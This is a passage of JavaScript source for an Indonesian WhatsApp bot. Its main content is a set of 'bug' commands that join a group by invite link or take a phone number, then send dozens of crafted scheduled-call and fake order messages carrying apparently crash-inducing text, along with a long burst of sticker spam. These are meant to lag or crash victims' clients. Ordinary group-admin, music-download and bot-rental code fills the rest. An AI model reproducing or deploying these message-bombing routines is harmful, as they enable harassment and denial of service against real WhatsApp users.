await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })

await sleep(5000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'unlidelaygc' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = virtex7
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlilaggc' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlibomgc' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlicuygc' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = tizi
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendgasfull' :  case '🐵':{
 if (!isCreator) return m.reply('*khusus Premium*')
 await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlidelay' :  case '🐒':{
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlilag' : case'🙊': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlibom' :  case '🙉':{
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlicuy' :  case '🙈':{
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'

jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = tizi
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//

case 'play2':  
case 'song2': {

conn.sendMessage(from, { react: { text: '♻️', key: m.key }})

if (!text) return reply(`Kirim Judul Lagu ❗`)
const playmp3 = require('./Media/lib/ytdl2')
let yts = require('youtube-yts')
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await playmp3.mp3(anup3k.url);
reply('Mengirim... ');
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
        case 'play4': case 'song4': {
                if (!text) return reply(`Example : ${prefix + command} Hey Daddy Home`)
                reply(mess.wait)
                if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3
            reply('_🚩 3 limit Terpakai!!.._')
                let yts = require ('yt-search')
                let search = await yts(`${text}`)
                let linknya = search.all[0].url
                let bodytextnya = `ᴛɪᴛʟᴇ : *${search.all[0].title}*\nᴠɪᴇᴡs : *${search.all[0].views}*\nᴅᴜʀᴀᴛɪᴏɴ : *${search.all[0].timestamp}*\nᴜᴘʟᴏᴀᴅᴇᴅ : *${search.all[0].ago}*\nᴜʀʟ : *${linknya}*`
               // conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
                
            let bokepp = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodytextnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : search.all[0].thumbnail }}, { upload: conn.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Video 🎬","id":"${prefix}ytmp4 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Audio 🎧","id":"${prefix}ytmp3 ${linknya}"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: botname,
                    newsletterJid: '120363310531380313@newsletter',
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await conn.relayMessage(bokepp.key.remoteJid, bokepp.message, {
  messageId: bokepp.key.id
})
            }
            break
//==============//
 case 'unlitet' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlidelay' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = virtex7
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlilag' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlibom' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlicuy' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlidocu': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
break

//=================================================//
case 'unlitroli': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "62345678910@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, order.message, { messageId: order.key.id })
await sleep(3000)
}
}
break
//=================================================//
case 'unlivirtext' :  {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlidocu': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(bnnd, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlitroli': {
if (!isCreator) return m.reply('*khusus Premium*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910`)
await loading()
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "62345678910@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
conn.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
//=================================================//
case 'linkgroup': case 'linkgc': {


if (!m.isGroup) return errorReply('Buat Di Group Bodoh')
if (!isBotAdmins) return errorReply('Bot Bukan Admin Cuy')
await loading()
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'resetlinkgc':
if (!isAdmins) return errorReply(mess.admin)

if (!m.isGroup) return errorReply('Buat Di Group Bodoh')
if (!isBotAdmins) return errorReply('Bot Bukan Admin Cuy')
await loading()
conn.groupRevokeInvite(from)
break
//=================================================//
case 'sendlinkgc': {
if (!isPrem) return errorReply(mess.prem)

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
    if (!isAdmins) return errorReply('lu emangnya atmin?')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910`)
await loading()
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
//=================================================//
case 'kick': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove')
}
break
//=================================================//
case 'add': {
if (!text) return reply('nama nomornya??')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break
//=================================================//
case 'promote': {

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break
//=================================================//
case 'demote': {

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break
//=================================================//
    case 'hidetag': case 'h': case 'ht': {
if (!isAdmins) return reply(mess.admin)
if (!isPrem) return reply (mess.prem)
if (!m.isGroup) return reply('Buat Di Group Bodoh')

conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//=================================================//
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (isBan) return errorReply('*Lu Di Ban Owner*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikeys}&text=${ini_txt}`)
conn.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break
//=================================================
case 'editgroup': {   

if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')

if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
//=================================================//
case 'editinfo': {

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break
//=================================================//
case 'join': {
if (!isPrem) return reply(mess.prem);
if (!text) return m.reply('Masukkan Link Grup!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Tautan Tidak Valid!')

let result = args[0].split('https://chat.whatsapp.com/')[1];
await conn.groupAcceptInvite(result)
  .then((res) => m.reply(jsonformat(res)))
  .catch((err) => m.reply(jsonformat(err)));
  }
break
//=================================================//
case 'editsubjek': {

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) return m.reply('Text nya ?')
await loading()
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'editdesk':{

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) return m.reply('Text Nya ?')
await loading()
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'tagall': {
     if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3
    reply('_🚩 3 Limit Terpakai!!..')
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak})
}
break
//=================================================//
case'demoteall':

if (!m.isGroup) return 
reply('Buat Di Group Bodoh')
if (!isBotAdmins) return 
reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case'promoteall':

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break
//=================================================//
case 'tutorial': {
await loading()
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}
Tutoriap pake bot silakan tanya ke yang laen/
https://wa.me/6285745267782`)
}
break
//=================================================//
case 'sewa':
        let asuu = `ʙᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʟɪꜱᴛ ʜᴀʀɢᴀ ᴜɴᴛᴜᴋ ꜱᴇᴡᴀ ʙᴏᴛ

╭────✎「 *ꜱᴇᴡᴀ ʙᴏᴛ* 」
│ *ʜᴀʀɢᴀ!*
│• ᴘᴇɴɢɢᴜɴᴀ ʙᴀʀᴜ ʀᴘ. 5.000/ɢʀᴏᴜᴘ
│• ᴘᴇʀᴘᴀɴᴊᴀɴɢ ʀᴘ. 3.000
│• ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ 15 ʜᴀʀɪ
╰─────────❍

╭────✎「 *ꜱᴇᴡᴀ ʙᴏᴛ* 」
│ *ʜᴀʀɢᴀ!*
│• ᴘᴇɴɢɢᴜɴᴀ ʙᴀʀᴜ ʀᴘ. 10.000/ɢʀᴏᴜᴘ
│• ᴘᴇʀᴘᴀɴᴊᴀɴɢ ʀᴘ. 5.000
│• ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ 30 ʜᴀʀɪ
╰─────────❍



╭────✎「 *ᴘʀᴇᴍɪᴜᴍ* 」
│ *ʜᴀʀɢᴀ!*
│• ʀᴘ. 10.000/ᴏʀᴀɴɢ
│• ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ 3 ʙᴜʟᴀɴ
╰─────────❍

╭────✎「 *ꜰɪᴛᴜʀ ᴘʀᴇᴍɪᴜᴍ* 」
│ *ʟɪꜱᴛɴʏᴀ!*
